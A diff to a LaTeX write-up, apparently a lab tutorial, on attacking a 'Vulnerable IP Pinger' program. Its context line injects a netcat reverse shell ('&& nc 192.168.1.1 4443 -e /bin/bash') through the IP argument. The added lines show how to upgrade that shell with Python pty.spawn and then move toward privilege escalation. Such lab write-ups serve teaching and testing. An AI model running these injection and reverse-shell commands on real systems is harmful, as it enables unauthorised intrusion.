@@ -48,4 +48,19 @@ Then on the server we launch the Vulnerable IP Pinger program and connect to our
     python3 IP-pinger.py 8.8.8.8 && nc 192.168.1.1 4443 -e /bin/bash
 \end{verbatim}
 
-TBC
+Once we are into a reverse shell, we can make our lives a bit nicer - especially if we are going to be working in this environment for a while. The first step of this is to run the Bash command below to check if Python is running.
+\begin{verbatim}
+    which python python3
+\end{verbatim}
+The output from this will tell us which version is installed, if either and from there amend the following command as required to allow us to spawn a Bash shell
+\begin{verbatim}
+    python3 -c 'import pty;pty.spawn("/bin/bash")'
+\end{verbatim}
+
+We can then run the two subsequent Bash commands which make the terminal environment more user friendly
+\begin{verbatim}
+    export SHELL=bash
+    export TERM=xterm-256color
+\end{verbatim}
+
+From here we can work through privilege escalation and aim to gain root access, or access to whatever other system we are attempting to get into. 
